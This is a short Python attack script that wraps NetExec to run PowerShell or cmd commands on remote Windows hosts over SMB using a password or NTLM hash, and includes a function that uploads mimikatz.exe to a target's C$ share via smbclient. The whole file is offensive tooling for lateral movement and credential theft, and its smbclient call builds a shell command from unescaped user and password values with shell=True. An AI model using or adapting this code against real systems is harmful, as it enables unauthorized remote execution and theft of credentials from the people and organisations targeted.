import subprocess

def execute_powershell(target: str, username: str, password: str, domain: str, ps_command: str, use_hash: bool = False) -> tuple[bool,str]:
    cmd = ['nxc', 'smb', target, '-u', username, '-d', domain]
    if use_hash:
        cmd.extend(['-H', password])
    else:
        cmd.extend(['-p', password])
    cmd.extend(['-X', ps_command])

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)

        output = result.stdout + result.stderr
        success = result.returncode ==0
        return success, output
    
    except Exception as e:
        return False, f"Error executing command: {str(e)}"

def execute_cmd(target: str, username: str, password: str, domain: str, ps_command: str, use_hash: bool = False) -> tuple[bool,str]:
    cmd = ['nxc', 'smb', target, '-u', username, '-d', domain]
    if use_hash:
        cmd.extend(['-H', password])
    else:
        cmd.extend(['-p', password])
    cmd.extend(['-x', ps_command])

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)

        output = result.stdout + result.stderr
        success = result.returncode ==0
        return success, output
    
    except Exception as e:
        return False, f"Error executing command: {str(e)}"
    
def drop_mimikatz(user: str, password: str, ip: str) -> None:
        smb_command = f"smbclient //{ip}/C$ -U {user}%'{password}' -c 'put mimikatz.exe Users\\{user}\\Desktop\\mimikatz.exe'"
        subprocess.run(smb_command, shell=True)